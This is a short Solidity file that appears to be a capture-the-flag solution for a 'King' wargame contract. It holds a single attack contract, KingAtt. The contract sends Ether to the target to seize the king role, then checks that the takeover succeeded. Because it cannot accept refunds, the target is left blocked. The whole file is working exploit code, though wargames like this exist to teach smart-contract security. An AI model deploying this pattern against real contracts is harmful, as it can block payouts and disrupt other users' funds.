// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface King {
    function _king() external returns (address payable);
}

contract KingAtt {
    function attack(address payable target) public payable {
        (bool ok, ) = target.call.value(msg.value)("");
        require(ok);

        require(King(target)._king() == address(this), "target not change");
    }
}
